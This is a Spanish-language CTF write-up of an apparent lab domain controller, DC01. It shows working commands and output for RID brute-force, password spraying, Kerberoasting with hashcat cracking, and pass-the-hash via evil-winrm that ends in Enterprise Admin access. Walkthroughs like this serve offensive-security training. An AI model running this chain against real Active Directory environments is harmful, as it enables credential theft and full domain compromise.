DC01 — Active Directory Exploitation

Explotación de un controlador de dominio Windows. Enumeración de Active Directory, descubrimiento de usuarios y shares, explotación de configuraciones inseguras de Kerberos y escalada de privilegios dentro del dominio.

Target192.168.x.x
OSWindows
Puerto88,389,445
Tiempo~30 min
Vectores3

Reconocimiento

Lo primero que haremos será identificar la dirección IP de la máquina objetivo. Para ello utilizamos arp-scan, una herramienta muy útil para descubrir hosts activos en la red.

🖥️ Descubrimiento de hosts
sudo arp-scan -I eth1 10.10.10.0/24 Interface: eth1, type: EN10MB, MAC: 08:00:27:41:0a:fa, IPv4: 10.10.10.101 Starting arp-scan 1.10.0 with 256 hosts 10.10.10.1 0a:00:27:00:00:0a (Unknown: locally administered) 10.10.10.100 08:00:27:3e:6b:2c (Unknown) 10.10.10.104 08:00:27:39:de:29 (Unknown) 3 packets received by filter, 0 packets dropped by kernel

Una vez identificada la dirección IP de la máquina (10.10.10.104), continuamos con un escaneo Nmap para obtener información sobre los servicios expuestos.

🖥️ Escaneo Nmap
sudo nmap -sSCV -p- -n --min-rate 5000 10.10.10.104 -vvv -oN scan PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc 49667/tcp open msrpc 49674/tcp open ncacn_http 49687/tcp open msrpc Service Info: Host: DC01; OS: Windows

Confirmamos el dominio con nxc:

🖥️ NetExec SMB
nxc smb 10.10.10.104 SMB 10.10.10.104 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
💡
Dominio confirmado: SOUPEDECODE.LOCAL con hostname DC01. Añadimos ambos al archivo /etc/hosts.
2

Explotación

🔍 Enumeración de usuarios vía RID Brute-Force

Probamos enumerar usuarios con nxc usando la cuenta guest:

🖥️ RID Brute-Force
nxc smb 10.10.10.104 -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{print $6}' | cut -d '\' -f 2 > domain_users.txt

🔑 Password Spraying

Sin credenciales válidas y sin resultados de AS-REP Roasting, probamos un ataque de password spraying comprobando si algún usuario tiene como contraseña su propio nombre:

🖥️ Password Spraying con NXC
nxc smb 10.10.10.104 -u domain_users.txt -p domain_users.txt --no-bruteforce --continue-on-success | grep '[+]' SMB 10.10.10.104 445 DC01 [+] SOUPEDECODE.LOCAL\ybob317:ybob317
✅
Credenciales obtenidas: ybob317 : ybob317

📂 Enumeración SMB — User Flag

Revisamos las carpetas compartidas accesibles con las credenciales obtenidas:

🖥️ SMBMap
smbmap -H 10.10.10.104 -u ybob317 -p ybob317 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin backup NO ACCESS C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share Users READ ONLY

Accedemos a la carpeta Users y obtenemos la primera flag:

🖥️ SMBClient — User Flag
smbclient //10.10.10.104/Users -U 'ybob317%ybob317' smb: \> cd ybob317\Desktop\ smb: \ybob317\Desktop\> dir desktop.ini AHS 282 Mon Jun 17 13:24:32 2024 user.txt A 32 Wed Jun 12 07:54:32 2024

🎟️ Kerberoasting

Con un usuario válido, procedemos a probar Kerberoasting para obtener tickets TGS de cuentas de servicio:

🖥️ Impacket GetUserSPNs
impacket-GetUserSPNs -request -dc-ip 10.10.10.104 -outputfile kerberoast_hashes.txt "SOUPEDECODE.LOCAL/ybob317:ybob317" ServicePrincipalName Name MemberOf PasswordLastSet ---------------------- -------------- -------- -------------------------- FTP/FileServer file_svc 2024-06-17 13:32:23 FW/ProxyServer firewall_svc 2024-06-17 13:28:32 HTTP/BackupServer backup_svc 2024-06-17 13:28:49 HTTP/WebServer web_svc 2024-06-17 13:29:04 HTTPS/MonitoringServer monitoring_svc 2024-06-17 13:29:18

Crackeamos los hashes con hashcat:

🖥️ Hashcat — Kerberoasting
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt file_svc : Password123!!
✅
Credenciales crackeadas: file_svc : Password123!!

💾 Backup Share — Machine Hashes

Con las credenciales de file_svc accedemos a la carpeta backup previamente inaccesible:

🖥️ SMBClient — Backup
smbclient //10.10.10.104/backup -U 'file_svc%Password123!!' smb: \> dir backup_extract.txt A 892 Mon Jun 17 04:41:05 2024

El fichero contiene hashes NTLM de múltiples máquinas del dominio:

🖥️ backup_extract.txt

Comprobamos cuáles son válidos:

🖥️ Validación de hashes
nxc smb 10.10.10.104 -u machines -H hashes | grep '[+]' SMB 10.10.10.104 445 DC01 [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
3

Post Explotación

Únicamente el hash de FileServer$ es válido y aparece marcado como Pwn3d!. Procedemos a obtener una shell mediante evil-winrm:

🖥️ Evil-WinRM — Pass the Hash
evil-winrm -i 10.10.10.104 -u 'FileServer$' -H e41da7e79a4c76dbd9cf79d1cb325559 Evil-WinRM shell v3.9 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\FileServer$\Documents>
⚠️
Enterprise Admins: La cuenta FileServer$ pertenece al grupo SOUPEDECODE\Enterprise Admins y cuenta con privilegios de BUILTIN\Administrators, incluyendo SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege y más.

Gracias a este nivel de privilegio, accedemos directamente al directorio del Administrador:

🖥️ Root Flag
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir Directory: C:\Users\Administrator\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 6/17/2024 10:41 AM backup -a---- 6/17/2024 10:44 AM 32 root.txt
💡
Nota: Al pertenecer a Enterprise Admins, también habríamos podido realizar un DCSync contra el DC para extraer todos los hashes del dominio.

Cadena de Ataque

🔍 Reconocimiento
arp-scan + Nmap identifican DC01 con Active Directory (SOUPEDECODE.LOCAL) y múltiples servicios expuestos (Kerberos, LDAP, SMB, WinRM).
👥 Enumeración de usuarios
RID brute-force vía cuenta guest para obtener lista completa de usuarios del dominio.
🔑 Password Spraying
Se descubre que ybob317 tiene como contraseña su propio nombre de usuario.
🚩 User Flag
Acceso SMB a la carpeta Users para obtener user.txt del escritorio de ybob317.
🎟️ Kerberoasting
Extracción y crackeo de TGS de file_svc → Password123!!
💾 Backup Share
Acceso a carpeta backup con hashes NTLM de máquinas del dominio. FileServer$ resulta válido y con Pwn3d!
🏴 Root Flag
Pass-the-Hash con FileServer$ vía Evil-WinRM. Cuenta con privilegios de Enterprise Admin → acceso directo a Administrator\Desktop.
